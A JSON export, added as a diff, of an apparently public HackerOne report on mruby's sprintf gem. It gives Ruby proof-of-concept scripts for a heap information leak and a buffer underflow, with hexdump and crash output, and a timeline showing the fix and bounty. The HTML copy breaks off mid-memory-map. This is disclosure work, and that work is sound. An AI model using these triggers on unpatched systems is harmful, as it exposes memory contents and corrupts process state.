@@ -1,0 +1,319 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-03-14T21:25:31.054Z", 
+    "voters": [
+        "delimitry", 
+        "eveeez", 
+        "spetr0x"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "100.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 212239, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-03-14T21:11:33.166Z", 
+    "vulnerability_information": "In the sprintf gem, NOT included in mruby-engine, there are severe vulnerabilities, including information leak, and heap buffer overflow. Here are the technical details.\n\nTechnical Error 1:\n==============\nThe ```CHECK(l)``` macro can sometimes receive negative values, that will bypass the size checks, since the resize loop is:\n```cpp\n#define CHECK(l) do {\\\n/*  int cr = ENC_CODERANGE(result);*/\\\n  while ((l) >= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n/*  ENC_CODERANGE_SET(result, cr);*/\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n```\nOne example for reaching a negative \"l\" value is in the \"G\" format when the width is \"2 ** 31 - 20\", causing ```need``` to be ```MIN_INT```:\n```cpp\n        if ((flags&FWIDTH) && need < width)\n            need = width;\n        need += 20;\n\n        CHECK(need);\n        n = snprintf(&buf[blen], need, fbuf, fval);\n        blen += n;\n```\n\nProposed Fix:\n-------------------\nSince there are several such IOFs, the best fix will be a robust check inside the macro itself.\nThe macro should add another check to raise an exception in case ```l < 0```.\n\nTechnical Error 2:\n==============\nStill in the \"G\" format, in case of a huge width, the ```snprintf``` call will fail, returning ```-1```:\n```cpp\n        n = snprintf(&buf[blen], need, fbuf, fval);\n        blen += n;\n```\nThis means that we can decrement ```blen``` by 1 for each such format primitive. \n\nInformation Leak PoC Script:\n------------------------------------------\n```ruby\nsecret_password = \"thisismysuperdupersecretpassword\"\n\nf = 1234567890.12345678\nunique = sprintf(\"% 2147483628G\", f)\n\nsample1 = \"1\" * 50\nsample2 = \"2\" * 100\nsample3 = \"3\" * 200\n\nprint unique.length\nprint unique\n```\nOn 32bit machines, the ```mrb_str_resize(-1)``` will create a string of length ```-1``` with a data buffer realloced with size 0 (= -1 + 1). The resulting output is:\n```\nhexdump sprintf_leak.bin\n0000000 312d 0000 0000 0000 0000 0000 0000 0000\n0000010 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000080 0000 0000 0000 0039 0000 3131 3131 3131\n0000090 3131 3131 3131 3131 3131 3131 3131 3131\n*\n00000b0 3131 3131 3131 3131 3131 3131 0000 0071\n00000c0 0000 3232 3232 3232 3232 3232 3232 3232\n00000d0 3232 3232 3232 3232 3232 3232 3232 3232\n*\n0000120 3232 3232 3232 0000 0000 0000 0000 00d1\n0000130 0000 3333 3333 3333 3333 3333 3333 3333\n0000140 3333 3333 3333 3333 3333 3333 3333 3333\n*\n00001f0 3333 3333 3333 3333 3333 0000 0000 05c9\n0000200 0000 ca20 b76f ca20 b76f ebd8 095d ebd8\n0000210 095d 0000 0000 0000 0000 0000 0000 0000\n0000220 0000 0000 0000 0000 0000 0000 0000 0000\n*\n00007c0 0000 05c8 0000 0010 0000 001b 0000 0001\n00007d0 0000 e048 095d 0029 0000 6874 7369 7369\n00007e0 796d 7573 6570 6472 7075 7265 6573 7263\n00007f0 7465 6170 7373 6f77 6472 0000 0000 0021\n0000800 0000 0810 0000 e2c0 0959 0000 0000 0020\n0000810 0000 e0f0 095d f200 095d 0000 0000 0029\n0000820 0000 6874 7369 7369 796d 7573 6570 6472\n0000830 7075 7265 6573 7263 7465 6170 7373 6f77\n0000840 6472 0000 0000 0019 0000 2025 3132 3734\n0000850 3834 3633 3832 0047 0000 0000 0000 0021\n0000860 0000 0810 0000 e2c0 0959 0000 0000 000d\n0000870 0000 e108 095d f260 095d 0000 0000 0019\n0000880 0000 2025 3132 3734 3834 3633 3832 0047\n0000890 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008a0 0959 0000 0000 0031 0000 0000 0000 0000\n00008b0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008c0 0959 0000 0000 0032 0000 0000 0000 0000\n00008d0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008e0 0959 0000 0000 0033 0000 0000 0000 0000\n00008f0 0000 0000 0000 dd31 0001 0000 0000 0000\n0000900 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0001000\n```\nAnd a close look will tell us that:\n* The print of ```unique.length``` returned ```-1```: 0x2d, 0x31\n* Our \"secret password\" can be found at the last memory block of the dump.\n\nHeap buffer underflow PoC Script:\n---------------------------------------------------\n```ruby\nf = 1234567890.12345678\nformat = \"% 2147483628G\" * 10 + \"!!!!!!!!!!!\"\n\nstr1 = \"1\" * 120\nunique = sprintf(format, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f)\nprint str1\n```\nDecrementing ```blen``` 10 times, will result in a buffer underflow of 10 bytes, that will write '!' on the ```str1```, as can be seen in the dump:\n```\n*** Error in `./mruby': double free or corruption (out): 0x09905b30 ***\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x67257)[0xb7530257]\n/lib/i386-linux-gnu/libc.so.6(+0x6d577)[0xb7536577]\n/lib/i386-linux-gnu/libc.so.6(+0x6dd31)[0xb7536d31]\n./mruby[0x804c81b]\n./mruby[0x80593f5]\n./mruby[0x8052760]\n./mruby[0x805a3a0]\n./mruby[0x80596bb]\n./mruby[0x80596f8]\n./mruby[0x804ce4d]\n./mruby[0x8049762]\n./mruby[0x8049c48]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb74e1637]\n./mruby[0x80491d1]\n======= Memory map: ========\n08048000-080ed000 r-xp 00000000 08:01 2883651    /XXX/mruby/bin/mruby\n080ed000-080ee000 r--p 000a4000 08:01 2883651   /XXX/mruby/bin/mruby\n080ee000-080ef000 rw-p 000a5000 08:01 2883651   /XXX/mruby/bin/mruby\n098c0000-09924000 rw-p 00000000 00:00 0          [heap]\nb7300000-b7321000 rw-p 00000000 00:00 0 \nb7321000-b7400000 ---p 00000000 00:00 0 \nb7495000-b74b1000 r-xp 00000000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74b1000-b74b2000 rw-p 0001b000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74c8000-b74c9000 rw-p 00000000 00:00 0 \nb74c9000-b7678000 r-xp 00000000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7678000-b7679000 ---p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7679000-b767b000 r--p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767b000-b767c000 rw-p 001b1000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767c000-b767f000 rw-p 00000000 00:00 0 \nb767f000-b76d2000 r-xp 00000000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d2000-b76d3000 r--p 00052000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d3000-b76d4000 rw-p 00053000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76e9000-b76ec000 rw-p 00000000 00:00 0 \nb76ec000-b76ee000 r--p 00000000 00:00 0          [vvar]\nb76ee000-b76ef000 r-xp 00000000 00:00 0          [vdso]\nb76ef000-b7711000 r-xp 00000000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7711000-b7712000 rw-p 00000000 00:00 0 \nb7712000-b7713000 r--p 00022000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7713000-b7714000 rw-p 00023000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nbff43000-bff64000 rw-p 00000000 00:00 0          [stack]\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!!Aborted (core dumped)\n```\n\nProposed Fix:\n--------------------\nShould check the return value of ```snprintf``` for errors, instead of directly using it by adding it to ```blen```.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "none", 
+        "author_type": "Team"
+    }, 
+    "title": "sprintf gem - format string combined attack", 
+    "is_member_of_team?": null, 
+    "vote_count": 3, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-04-13T21:11:33.210Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$100", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": true, 
+            "created_at": "2017-03-10T11:35:40.028Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-10T11:35:40.028Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!", 
+            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1532015, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-10T16:11:51.008Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-10T16:11:51.008Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "None", 
+                "old_severity": "High"
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1532674, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-10T16:18:36.023Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-10T16:18:36.023Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. We have reproduced the bugs and opened an issue upstream: https://github.com/mruby/mruby/issues/3498", 
+            "markdown_message": "<p>Thank you for your report. We have reproduced the bugs and opened an issue upstream: <a title=\"https://github.com/mruby/mruby/issues/3498\" href=\"/redirect?signature=53923f588187fb1b26b99f5c277e238752dc735e&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3498\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3498</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1532702, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt"
+            }, 
+            "created_at": "2017-03-14T14:58:41.275Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T14:58:41.275Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks again for your report. This issue was addressed in the following upstream commits:\n\nhttps://github.com/mruby/mruby/commit/e3922318bd2679de7930ba7c520d58961340e006\nhttps://github.com/mruby/mruby/commit/f30ec2dfb0217fd1426dbdfa1db22da51bbe73b5\nhttps://github.com/mruby/mruby/commit/94395e81c1e853fbfd507a0d12e5836a64bf0ce7\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.\n", 
+            "markdown_message": "<p>Thanks again for your report. This issue was addressed in the following upstream commits:</p>\n\n<p><a title=\"https://github.com/mruby/mruby/commit/e3922318bd2679de7930ba7c520d58961340e006\" href=\"/redirect?signature=4f7cea3bdab8bd035dd81ab1352f25ca917da6ac&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fe3922318bd2679de7930ba7c520d58961340e006\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/e3922318bd2679de7930ba7c520d58961340e006</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://github.com/mruby/mruby/commit/f30ec2dfb0217fd1426dbdfa1db22da51bbe73b5\" href=\"/redirect?signature=e2d1ebd83cc10ddc4fc2ae1e6ca6c828bdfab99b&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Ff30ec2dfb0217fd1426dbdfa1db22da51bbe73b5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/f30ec2dfb0217fd1426dbdfa1db22da51bbe73b5</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://github.com/mruby/mruby/commit/94395e81c1e853fbfd507a0d12e5836a64bf0ce7\" href=\"/redirect?signature=277ea63a40887428e6f909a82fccc3dc2348d3e6&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F94395e81c1e853fbfd507a0d12e5836a64bf0ce7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/94395e81c1e853fbfd507a0d12e5836a64bf0ce7</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1540242, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:11:27.751Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:11:27.751Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "100.0", 
+            "collaborator": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt"
+            }, 
+            "message": "Thanks for helping improve the security of the MRuby project!", 
+            "markdown_message": "<p>Thanks for helping improve the security of the MRuby project!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1541596, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:11:33.188Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:11:33.188Z", 
+            "actor": {
+                "username": "andrewdunbar", 
+                "url": "/andrewdunbar", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1541597, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:25:31.072Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:25:31.072Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks for the reward.", 
+            "markdown_message": "<p>Thanks for the reward.</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1541625, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-14T21:25:31.118Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-14T21:25:31.118Z", 
+            "actor": {
+                "username": "aerodudrizzt", 
+                "url": "/aerodudrizzt", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/098/646/dd4a57adcca0f309d5866361ff6cf9a683425281_medium.png?1483983167"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1541626, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "aerodudrizzt", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/aerodudrizzt", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/098/646/6dd706f25a4db060df25b01c8609c8f1762533f0_small.png?1483983167"
+        }, 
+        "is_me?": false
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -52018243.39514076, 
+    "disclosed_at": "2017-03-14T21:25:31.099Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/212239", 
+    "created_at": "2017-03-10T11:35:39.810Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>In the sprintf gem, NOT included in mruby-engine, there are severe vulnerabilities, including information leak, and heap buffer overflow. Here are the technical details.</p>\n\n<h1 id=\"technical-error-1\">Technical Error 1:</h1>\n\n<p>The <code>CHECK(l)</code> macro can sometimes receive negative values, that will bypass the size checks, since the resize loop is:</p>\n<pre class=\"highlight cpp\"><code><span class=\"cp\">#define CHECK(l) do {\\\n</span><span class=\"cm\">/*  int cr = ENC_CODERANGE(result);*/</span><span class=\"cp\">\\\n  while ((l) &gt;= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n</span><span class=\"cm\">/*  ENC_CODERANGE_SET(result, cr);*/</span><span class=\"cp\">\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n</span></code></pre>\n<p>One example for reaching a negative &quot;l&quot; value is in the &quot;G&quot; format when the width is &quot;2 ** 31 - 20&quot;, causing <code>need</code> to be <code>MIN_INT</code>:</p>\n<pre class=\"highlight cpp\"><code>        <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">flags</span><span class=\"o\">&amp;</span><span class=\"n\">FWIDTH</span><span class=\"p\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">need</span> <span class=\"o\">&lt;</span> <span class=\"n\">width</span><span class=\"p\">)</span>\n            <span class=\"n\">need</span> <span class=\"o\">=</span> <span class=\"n\">width</span><span class=\"p\">;</span>\n        <span class=\"n\">need</span> <span class=\"o\">+=</span> <span class=\"mi\">20</span><span class=\"p\">;</span>\n\n        <span class=\"n\">CHECK</span><span class=\"p\">(</span><span class=\"n\">need</span><span class=\"p\">);</span>\n        <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">snprintf</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">blen</span><span class=\"p\">],</span> <span class=\"n\">need</span><span class=\"p\">,</span> <span class=\"n\">fbuf</span><span class=\"p\">,</span> <span class=\"n\">fval</span><span class=\"p\">);</span>\n        <span class=\"n\">blen</span> <span class=\"o\">+=</span> <span class=\"n\">n</span><span class=\"p\">;</span>\n</code></pre>\n<h2 id=\"proposed-fix\">Proposed Fix:</h2>\n\n<p>Since there are several such IOFs, the best fix will be a robust check inside the macro itself.<br>\nThe macro should add another check to raise an exception in case <code>l &lt; 0</code>.</p>\n\n<h1 id=\"technical-error-2\">Technical Error 2:</h1>\n\n<p>Still in the &quot;G&quot; format, in case of a huge width, the <code>snprintf</code> call will fail, returning <code>-1</code>:</p>\n<pre class=\"highlight cpp\"><code>        <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">snprintf</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">blen</span><span class=\"p\">],</span> <span class=\"n\">need</span><span class=\"p\">,</span> <span class=\"n\">fbuf</span><span class=\"p\">,</span> <span class=\"n\">fval</span><span class=\"p\">);</span>\n        <span class=\"n\">blen</span> <span class=\"o\">+=</span> <span class=\"n\">n</span><span class=\"p\">;</span>\n</code></pre>\n<p>This means that we can decrement <code>blen</code> by 1 for each such format primitive. </p>\n\n<h2 id=\"information-leak-poc-script\">Information Leak PoC Script:</h2>\n<pre class=\"highlight ruby\"><code><span class=\"n\">secret_password</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;thisismysuperdupersecretpassword&quot;</span>\n\n<span class=\"n\">f</span> <span class=\"o\">=</span> <span class=\"mi\">1234567890</span><span class=\"o\">.</span><span class=\"mi\">12345678</span>\n<span class=\"n\">unique</span> <span class=\"o\">=</span> <span class=\"nb\">sprintf</span><span class=\"p\">(</span><span class=\"s2\">&quot;% 2147483628G&quot;</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">)</span>\n\n<span class=\"n\">sample1</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;1&quot;</span> <span class=\"o\">*</span> <span class=\"mi\">50</span>\n<span class=\"n\">sample2</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;2&quot;</span> <span class=\"o\">*</span> <span class=\"mi\">100</span>\n<span class=\"n\">sample3</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;3&quot;</span> <span class=\"o\">*</span> <span class=\"mi\">200</span>\n\n<span class=\"nb\">print</span> <span class=\"n\">unique</span><span class=\"p\">.</span><span class=\"nf\">length</span>\n<span class=\"nb\">print</span> <span class=\"n\">unique</span>\n</code></pre>\n<p>On 32bit machines, the <code>mrb_str_resize(-1)</code> will create a string of length <code>-1</code> with a data buffer realloced with size 0 (= -1 + 1). The resulting output is:</p>\n<pre class=\"highlight plaintext\"><code>hexdump sprintf_leak.bin\n0000000 312d 0000 0000 0000 0000 0000 0000 0000\n0000010 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000080 0000 0000 0000 0039 0000 3131 3131 3131\n0000090 3131 3131 3131 3131 3131 3131 3131 3131\n*\n00000b0 3131 3131 3131 3131 3131 3131 0000 0071\n00000c0 0000 3232 3232 3232 3232 3232 3232 3232\n00000d0 3232 3232 3232 3232 3232 3232 3232 3232\n*\n0000120 3232 3232 3232 0000 0000 0000 0000 00d1\n0000130 0000 3333 3333 3333 3333 3333 3333 3333\n0000140 3333 3333 3333 3333 3333 3333 3333 3333\n*\n00001f0 3333 3333 3333 3333 3333 0000 0000 05c9\n0000200 0000 ca20 b76f ca20 b76f ebd8 095d ebd8\n0000210 095d 0000 0000 0000 0000 0000 0000 0000\n0000220 0000 0000 0000 0000 0000 0000 0000 0000\n*\n00007c0 0000 05c8 0000 0010 0000 001b 0000 0001\n00007d0 0000 e048 095d 0029 0000 6874 7369 7369\n00007e0 796d 7573 6570 6472 7075 7265 6573 7263\n00007f0 7465 6170 7373 6f77 6472 0000 0000 0021\n0000800 0000 0810 0000 e2c0 0959 0000 0000 0020\n0000810 0000 e0f0 095d f200 095d 0000 0000 0029\n0000820 0000 6874 7369 7369 796d 7573 6570 6472\n0000830 7075 7265 6573 7263 7465 6170 7373 6f77\n0000840 6472 0000 0000 0019 0000 2025 3132 3734\n0000850 3834 3633 3832 0047 0000 0000 0000 0021\n0000860 0000 0810 0000 e2c0 0959 0000 0000 000d\n0000870 0000 e108 095d f260 095d 0000 0000 0019\n0000880 0000 2025 3132 3734 3834 3633 3832 0047\n0000890 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008a0 0959 0000 0000 0031 0000 0000 0000 0000\n00008b0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008c0 0959 0000 0000 0032 0000 0000 0000 0000\n00008d0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008e0 0959 0000 0000 0033 0000 0000 0000 0000\n00008f0 0000 0000 0000 dd31 0001 0000 0000 0000\n0000900 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0001000\n</code></pre>\n<p>And a close look will tell us that:</p>\n\n<ul>\n<li>The print of <code>unique.length</code> returned <code>-1</code>: 0x2d, 0x31</li>\n<li>Our &quot;secret password&quot; can be found at the last memory block of the dump.</li>\n</ul>\n\n<h2 id=\"heap-buffer-underflow-poc-script\">Heap buffer underflow PoC Script:</h2>\n<pre class=\"highlight ruby\"><code><span class=\"n\">f</span> <span class=\"o\">=</span> <span class=\"mi\">1234567890</span><span class=\"o\">.</span><span class=\"mi\">12345678</span>\n<span class=\"nb\">format</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;% 2147483628G&quot;</span> <span class=\"o\">*</span> <span class=\"mi\">10</span> <span class=\"o\">+</span> <span class=\"s2\">&quot;!!!!!!!!!!!&quot;</span>\n\n<span class=\"n\">str1</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;1&quot;</span> <span class=\"o\">*</span> <span class=\"mi\">120</span>\n<span class=\"n\">unique</span> <span class=\"o\">=</span> <span class=\"nb\">sprintf</span><span class=\"p\">(</span><span class=\"nb\">format</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">,</span> <span class=\"n\">f</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span> <span class=\"n\">str1</span>\n</code></pre>\n<p>Decrementing <code>blen</code> 10 times, will result in a buffer underflow of 10 bytes, that will write &#39;!&#39; on the <code>str1</code>, as can be seen in the dump:</p>\n<pre class=\"highlight plaintext\"><code>*** Error in `./mruby&#39;: double free or corruption (out): 0x09905b30 ***\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x67257)[0xb7530257]\n/lib/i386-linux-gnu/libc.so.6(+0x6d577)[0xb7536577]\n/lib/i386-linux-gnu/libc.so.6(+0x6dd31)[0xb7536d31]\n./mruby[0x804c81b]\n./mruby[0x80593f5]\n./mruby[0x8052760]\n./mruby[0x805a3a0]\n./mruby[0x80596bb]\n./mruby[0x80596f8]\n./mruby[0x804ce4d]\n./mruby[0x8049762]\n./mruby[0x8049c48]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb74e1637]\n./mruby[0x80491d1]\n======= Memory map: ========\n08048000-080ed000 r-xp 00000000 08:01 2883651    